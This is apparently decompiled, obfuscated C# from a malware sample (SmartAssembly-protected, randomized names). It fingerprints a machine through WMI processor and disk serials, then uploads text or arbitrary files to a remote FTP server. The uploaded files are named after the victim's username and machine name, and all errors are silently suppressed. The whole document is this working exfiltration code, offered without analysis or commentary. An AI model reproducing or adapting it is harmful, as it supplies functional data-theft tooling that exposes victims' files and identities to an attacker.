using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace coxZRmDhvSAWo;

internal sealed class c000013
{
	[NonSerialized]
	internal static GetString f00004b;

	public static string RuDYtoNcCxI()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass("win32_processor");
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item("processorID").get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = "C";
			ManagementObject val3 = new ManagementObject("win32_logicaldisk.deviceid=\"" + text2 + ":\"");
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item("VolumeSerialNumber").ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? "" : text;
		}
	}

	public static void gmIyowWwkfSR(string GdSqezTpHHWqI = "URL", string p1 = "USERNAME", string CFfTnLBdettRX = "ACCESO", string p3 = "")
	{
		try
		{
			string text = "";
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(GdSqezTpHHWqI + "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + text + ".txt");
			ftpWebRequest.Method = "STOR";
			ftpWebRequest.Credentials = new NetworkCredential(p1, CFfTnLBdettRX);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(p3);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void ybntlhJHhisLb(string p0 = "URL", string p1 = "USERNAME", string gImcvsvcXxT = "ACCESO", string p3 = "")
	{
		try
		{
			string text = "";
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(p0 + "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + text + "_" + Path.GetFileName(p3));
			ftpWebRequest.Method = "STOR";
			ftpWebRequest.Credentials = new NetworkCredential(p1, gImcvsvcXxT);
			byte[] array = File.ReadAllBytes(p3);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static c000013()
	{
		Strings.CreateGetStringDelegate(typeof(c000013));
	}
}
